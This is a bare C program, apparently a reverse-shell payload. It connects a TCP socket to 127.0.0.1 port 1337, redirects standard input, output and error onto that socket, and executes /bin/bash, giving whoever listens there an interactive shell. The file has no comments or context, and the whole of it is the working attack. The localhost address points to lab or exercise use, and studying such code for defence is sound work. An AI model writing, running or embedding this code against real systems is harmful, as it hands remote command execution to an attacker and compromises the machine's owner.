#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("127.0.0.1");
    sin.sin_port = htons(1337);
    connect(sock, (struct sockaddr*)&sin, sizeof(struct sockaddr_in));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execl("/bin/bash", "ls", NULL);

    return 0; 
}
